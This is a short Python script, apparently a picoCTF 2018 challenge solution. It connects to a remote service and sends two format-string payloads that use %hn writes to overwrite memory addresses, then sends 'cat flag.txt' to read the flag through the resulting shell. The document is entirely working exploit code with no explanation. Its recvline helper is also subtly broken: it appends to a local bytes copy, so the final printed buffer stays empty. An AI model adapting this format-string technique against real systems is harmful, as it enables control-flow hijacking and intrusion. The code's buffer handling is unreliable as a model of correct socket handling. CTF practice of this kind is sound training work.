import socket


def recvline(soc, buf):
    s = soc.recv(4096)
    buf += s
    print(s)
    while len(s) > 1 and s.find(b"\n") < 0:
        s = soc.recv(4096)
        buf += s


hostname = "2018shell.picoctf.com"
port = 56800
payload1 = bytes.fromhex("1ca004081ea00408") + b"%2044x%8$hn%32167x%7$hn\n"
payload2 = bytes.fromhex("10a0040812a00408") + b"%2044x%8$hn%31836x%7$hn\n"
payload3 = b"cat flag.txt\n"

soc = socket.socket()
soc.connect((hostname, port))
buf = bytes()

recvline(soc, buf)
soc.sendall(payload1)
recvline(soc, buf)
soc.sendall(payload2)
recvline(soc, buf)
soc.sendall(payload3)
recvline(soc, buf)

print(str(buf))
